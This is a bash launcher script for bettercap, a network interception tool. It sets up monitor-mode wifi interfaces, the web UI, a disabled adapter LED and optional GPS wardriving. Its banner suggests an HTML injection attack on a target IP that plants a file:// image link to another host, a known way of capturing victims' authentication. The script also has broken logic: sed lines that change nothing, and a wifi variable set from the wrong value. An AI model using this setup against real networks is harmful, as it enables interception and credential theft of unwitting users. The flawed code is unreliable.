#!/bin/bash
clear
#set -x
#--------------------------------------------------
# Banner for the 1337'ishness
#--------------------------------------------------
cat << "EOF"

 B E T T E R C A P 

Try: --proxy \
     --proxy-module injecthtml \
     --html-data "<img src='file://192.168.0.26/aaa/bbb.jpg'/>" \
     -T 192.168.0.12

EOF
#--------------------------------------------------
# VARIABLES
#--------------------------------------------------
BETTERCAP="/usr/bin/bettercap"
BETTERCAP="./bettercap-2.32.0/build/bettercap"
#--------------------------------------------------
# PRE 
#--------------------------------------------------
if [ ${UID} -ne 0 ]; then 
 printf "\n### ERROR - This script must run as user root\n\n"
 exit 1
fi
#--------------------------------------------------
# SET USER AND PASSWORD
#--------------------------------------------------
if [ ! -x ${BETTERCAP} ]; then 
  printf " ### ERROR - Cant find ${BETTERCAP}\n\n"
  exit 1
fi
CAP_DIR="/usr/local/share/bettercap/caplets"
for CAP in ${CAP_DIR}/http-ui.cap ${CAP_DIR}/https-ui.cap; do
 if [ ! -s ${CAP} ]; then 
  printf "\n - Updating the http GUI..\n" 
  /usr/bin/bettercap -eval "caplets.update; ui.update; q"
  if [ ! -s ${CAP} ]; then 
   printf "\n ### ERROR - Cant find ${CAP}\n\n"
   exit 1
  fi
 fi
 sed -i 's/set api.rest.username user/set api.rest.username user/'    ${CAP}
 sed -i 's/set api.rest.password pass/set api.rest.password pass/' ${CAP}
done
#--------------------------------------------------
# UNBLOCK WIFI
#--------------------------------------------------
/usr/sbin/rfkill unblock wifi >/dev/null 2>&1
#--------------------------------------------------
# PREPARE WIFI
#--------------------------------------------------
echo "Alter wlans here..!!line 56"
for WLAN in wlan1 wlan2; do
 iw ${WLAN} set monitor control >/dev/null 2>&1
 ifconfig ${WLAN} up >/dev/null 2>&1
done
#--------------------------------------------------
# STOP USE OF PORT 80
#--------------------------------------------------
service apache2 stop
#--------------------------------------------------
# DELAY START FIREFOX
#--------------------------------------------------
sleep 5 && /usr/sbin/runuser -u ${USER} -- firefox http://127.0.0.1:80 &
firefoxpid=$!
#--------------------------------------------------
# TURN OFF LED (works after next boot)
#--------------------------------------------------
if [ ! -f /etc/modprobe.d/alfa_led_off.conf ]; then 
 echo 'options 88XXau rtw_led_ctrl=0' > /etc/modprobe.d/alfa_led_off.conf
fi
#--------------------------------------------------
# USE BEST WIFI FOR PROBING
#--------------------------------------------------
echo "SET WIFI line 79"
WIFI="wlan1"
if [ $(/usr/bin/lsusb|grep -c "0bda:8812") -ne 0 ]; then 
 WLAN="$(for WLAN in $(ls -d /sys/class/net/wlan*); do if [ $(udevadm info $WLAN|grep -c RTL8812AU) -ne 0 ]; then echo "$(basename $WLAN)";fi;done|head -1)"
 if [ ! -z "${WLAN}" ]; then 
  WIFI="set wifi.interface ${WIFI}; wifi.recon on"
 fi
fi
#--------------------------------------------------
# START WITH GPS IF PRESENT
#--------------------------------------------------
if [ -L /dev/ttyUSB-GPS ]; then 
 ${BETTERCAP} -caplet http-ui -eval "set gps.device /dev/ttyUSB-GPS ; gps on;sleep 5;gps.show;${WIFI}" 
else
 ${BETTERCAP} -caplet http-ui
fi
#--------------------------------------------------
# CLEANUP
#--------------------------------------------------
kill ${firefoxpid} 2>/dev/null
#--------------------------------------------------
# END OF SCRIPT
#--------------------------------------------------
